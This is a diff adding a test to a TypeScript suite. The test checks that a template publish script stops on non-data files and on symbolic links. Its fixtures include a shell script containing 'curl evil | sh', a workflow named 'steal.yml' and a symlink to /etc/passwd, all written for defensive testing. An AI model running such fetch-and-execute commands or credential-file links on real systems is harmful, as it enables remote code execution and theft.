@@ -37,3 +37,48 @@ test("the published template is a valid Roll made only of data files", () => {
   assert.match(rollReadme, /namespace, not a privacy\s+boundary/);
   assert.deepEqual(new GitRoll(out).check(), []);
 });
+
+/** A copy of template/ that a test can add a file to. */
+function templateCopy(): string {
+  const dir = path.join(tmp(), "template");
+  fs.cpSync(fileURLToPath(new URL("../template", import.meta.url)), dir, { recursive: true });
+  return dir;
+}
+
+function publish(template: string): { ok: boolean; output: string } {
+  try {
+    execFileSync(process.execPath, [script, "--out", path.join(tmp(), "out"), "--template", template], { env: process.env, stdio: "pipe" });
+    return { ok: true, output: "" };
+  } catch (e) {
+    const err = e as { stdout?: Buffer; stderr?: Buffer };
+    return { ok: false, output: `${err.stdout ?? ""}${err.stderr ?? ""}` };
+  }
+}
+
+test("anything that isn't Roll data stops the publish, rather than being left out of it", () => {
+  // The allowlist is what keeps code out of a stranger's Roll, so it has to
+  // refuse loudly. Quietly publishing the rest would hide the mistake: the
+  // template would look right while the change someone made went missing.
+  assert.ok(publish(templateCopy()).ok, "template/ as it stands publishes");
+
+  for (const [name, write] of [
+    [".github/workflows/steal.yml", (dir: string) => fs.writeFileSync(path.join(dir, ".github/workflows/steal.yml"), "on: push\n")],
+    ["install.sh", (dir: string) => fs.writeFileSync(path.join(dir, "install.sh"), "curl evil | sh\n")],
+    [".gitroll/hook.js", (dir: string) => fs.writeFileSync(path.join(dir, ".gitroll/hook.js"), "process.exit(1)\n")],
+  ] as const) {
+    const dir = templateCopy();
+    fs.mkdirSync(path.dirname(path.join(dir, name)), { recursive: true });
+    write(dir);
+    const { ok, output } = publish(dir);
+    assert.ok(!ok, `${name} must stop the publish`);
+    assert.match(output, /Refusing to publish non-Roll files/);
+    assert.ok(output.includes(name), `and say which file: ${name}`);
+  }
+
+  // A symbolic link is refused before it is read, wherever it points.
+  const linked = templateCopy();
+  fs.symlinkSync("/etc/passwd", path.join(linked, "README.md.link"));
+  const { ok, output } = publish(linked);
+  assert.ok(!ok, "a symbolic link must stop the publish");
+  assert.match(output, /symbolic link/);
+});
